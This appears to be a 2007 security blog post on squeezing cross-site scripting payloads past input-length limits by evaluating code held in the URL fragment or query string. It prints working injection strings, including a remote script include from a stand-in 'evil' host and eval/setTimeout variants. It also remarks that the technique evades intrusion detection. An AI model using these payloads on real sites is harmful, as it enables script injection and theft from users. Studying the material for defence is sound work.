---
title: Playing in Large
author: petko-d-petkov
date: Tue, 06 Feb 2007 14:18:53 GMT
template: this/views/post.jade
---

> Many times, Web Applications enforce restrictions on the number of characters the user can input. That happens quite often since this is probably the easiest and most obvious way of sanitizing the user input. Overcoming these restrictions, when performing Cross-site scripting attacks, is a challenge, so I am going to discuss a few techniques that I have developed, which prove to be quite useful in various situations.

When you are restricted by the size of input, you have to think about the smallest possible unit that can expand to something that is much bigger. In traditional buffer overflow vulnerabilities attackers take advantage of various packaging techniques. Sometimes, the overflow crack is so small that only 140-160 bites (figuratively speaking) of data can squeeze in. This obstacle is overcome by injecting small piece of binary code that downloads additional, much larger, piece of code (probably an executable). Similar principles apply to Cross-site scripting vulnerabilities. Let's generalize the XSS payload structure in order to find how to squeeze data into a **N** characters long field.

When dealing with Cross-site scripting vulnerabilities we may need to close or fix the markup to the place where the injection occurs. This adds a few characters, so we need to count them as part of the payload. Think about them as a nop sled. If the injection occurs inside an element attribute, you may need to inject something like the following:

	">[payload]<!--

The first two characters will close/fix the markup to the place where the injection occurs. Then the payload follows. After the payload everything else is commented out to ensure that nothing breaks the injected code. This adds four characters at the end.

Most of the time, when more then the maximum characters needs to be inject, attackers go through the extreme situation of including a remote JavaScript file via a `SCRIPT` tag. For example:

	"><script src="http://path/to/evil"></script><!--

This file can be of any size and can contain as much code as we want. However, like overflow vulnerabilities, this technique is fairly restricted in terms of the easily applicable preventing mechanisms against it.

If you imagine that the payload, discussed above, is part of an AJAX worm, the easiest way to fight the malware back is to block access to `http://path/to/evil`. That of course is not the desired effect attackers try to achieve.

In order to bypass the restriction without using external resources you need to look for a way of transmitting information to the exploited target. This can be achieved by setting the cookie wit CSRF, for example, and evaluating its content inside the browser. The following may become our payload:

	"><script>eval(document.cookie)</script><!--

Sneaky! This technique relies on a different vulnerability so it might not be the best way of achieving the desires result.

Fortunately or not, WEB technologies are so flexible that attackers can always find ways to squeeze stuff in the fields they are after. Here is how we can change the payload in order to fit a couple of kilobytes JavaScript code inside 60 characters long field.

	"><script>eval(location.hash.substr(1))</script><!--

The payload above is composed of 55 characters in total. This includes the sled and the end fix. What this snippet does is evaluating everything that is part of the hash (fragment identifier), which is part of the URL. The above payload can be translated into the following imaginative attack URL.

	http://path/to/vulnerable/application?vuln="><script>eval(location.hash.substr(1))</script><!--#**[payload]**

If you replace "**[payload]**" with the code your want to execute then in practice you inject 55 characters into the server side application and the rest is obtained by the client. The server side restriction is bypassed. This attack can be refined to produce even smaller injected payload. For example:

	http://path/to/vulnerable/application?vuln="><script>eval(location.substr(92))</script><!--#**[payload]**

The example above presents a reduced payload that is composed of 48 characters in total. Keep in mind that we are still able to evaluate everything that is after the hash or in simple words; we evaluate everything from the URL after the 92nd character.

Although we are generally discussing how to fit more stuff into a size restricted, unsanitezed field, the techniques presented above are suitable for all kind of situations. In fact, I believe that they are the desired way of performing Cross-site scripting attacks.

You should know that fragment identifier (the hash) is not part of the server request; as such attackers can use it to hide their malicious activities. Every large URL can trigger the Intrusion Detection system. This is something that attackers try to avoid. If the server activities are less suspicious, the chances of somebody discovering the exploit are also greatly reduced.

For testing and demonstration purposes you can use the following list of variations of the attack technique discussed in this article:

```javascript
eval(location.substr(92))
setTimeout(location.substr(92))
```

```javascript
eval(location.hash.substr(1))
setTimeout(location.hash.substr(1))
```

```javascript
eval((''+location).substr(28))
setTimeout((''+location).substr(28))
```

```javascript
eval(location.search.substr(20))
setTimeout(location.search.substr(20))
```
